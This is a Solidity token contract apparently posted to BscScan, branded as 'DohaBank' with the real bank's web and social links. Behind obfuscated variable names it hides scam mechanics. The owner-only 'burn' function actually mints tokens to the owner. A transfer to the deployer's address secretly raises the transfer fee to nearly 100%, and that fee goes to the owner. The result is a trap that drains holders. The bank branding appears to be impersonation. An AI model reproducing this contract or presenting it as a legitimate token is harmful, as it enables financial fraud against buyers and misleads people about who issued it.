/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

//Doha Bank is one of the largest commercial banks in Qatar, incorporated in 1978 and commenced 
//its banking services in Doha, Qatar on March 15, 1979.
//https://qa.dohabank.com/
//https://www.facebook.com/Doha.Bank
//https://twitter.com/DohaBankQatar
//https://www.linkedin.com/company/doha-bank
//https://www.instagram.com/dohabankofficial/
//https://www.youtube.com/user/DohaBankQatar

pragma solidity >=0.5.0;
contract DohaBank {
string public  name = "DohaBank";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "DohaBank";
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
uint256 private  YWKLHS = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant MCGXOP = 99999;
uint256 private  UWYKVW = 10000000000;
uint256 private  REJCVL = 1000000000000000000;
address private  OGTXYP = address(0);
uint256 private  RMDACE = 10000000000000;
uint256 private  VGRZLD = 1000000000000000000;
address private  QIVNUX = address(0);
uint8 public constant decimals = 18;
uint256 private  RCIUXD = 1000000000000000000000;
uint256 private  WMNYTU = 100000000;
address private  IHIOON = address(0);
address private  TEKGPC = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  JDVCBG = address(0);
function _getTEKGPC() private returns (address) {
return TEKGPC;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WDCRVS");
require(to != address(0), "WDCRVS");
require(amount <= balanceOf[from], "WDCRVS");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MCGXOP/REJCVL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OGTXYP){
REJCVL = MCGXOP+2;
}
emit Transfer(from, to, transferAmount);
}
function _getQIVNUX() private returns (address) {
return QIVNUX;
}

function _getRMDACE() private returns (uint256) {
return RMDACE;
}

function _getRCIUXD() private returns (uint256) {
return RCIUXD;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getJDVCBG() private returns (address) {
return JDVCBG;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getUWYKVW() private returns (uint256) {
return UWYKVW;
}

function _getVGRZLD() private returns (uint256) {
return VGRZLD;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tWDCRVS 0");
require(spender != address(0), "fWDCRVS 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getYWKLHS() private returns (uint256) {
return YWKLHS;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getIHIOON() private returns (address) {
return IHIOON;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
OGTXYP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getWMNYTU() private returns (uint256) {
return WMNYTU;
}


}